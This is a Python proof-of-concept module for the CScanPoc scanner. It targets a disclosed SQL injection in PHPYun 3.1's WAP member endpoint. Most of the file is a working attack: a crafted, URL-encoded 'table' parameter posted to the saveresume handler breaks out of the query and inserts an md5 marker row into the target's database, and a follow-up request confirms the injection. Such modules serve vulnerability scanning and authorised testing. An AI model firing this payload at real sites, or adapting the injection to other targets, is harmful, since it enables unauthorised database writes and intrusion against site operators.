# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPYun_0101'  # 平台漏洞编号，留空
    name = 'PHPYun 3.1 /wap/member/model/index.class.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-16'  # 漏洞公布时间
    desc = '''
        PHP云人才管理系统，专业的人才招聘网站系统开源程序，采用PHP 和MySQL 数据库构建的高效的人才与企业求职招招聘系统源码。
        /wap/member/model/index.class.php 过滤不严谨。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=071296'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPYun'  # 漏洞应用名称
    product_version = '3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e85ddb23-a45a-4a65-973d-89ad915a09d9'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            fake_headers = {}
            fake_headers['User-Agent'] = "iPhone6"
            check_url = '%s/index.php?m=resume&id=999999' % self.target
            verify_url = '%s/wap/member/index.php?m=index&c=saveresume' % self.target
            data = 'table=expect%60%20%28id%2Cuid%2Cname%29%20values%20%28' \
                   '999999%2C1%2C%28md5%280x23333333%29%29%29%23&subm' \
                   'it=111&eid=1'
            req = urllib.request.Request(
                verify_url, data=data, headers=fake_headers)
            urllib.request.urlopen(req)
            content = urllib.request.urlopen(check_url).read()
            if '2eb120797101bb291fd4a6764' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
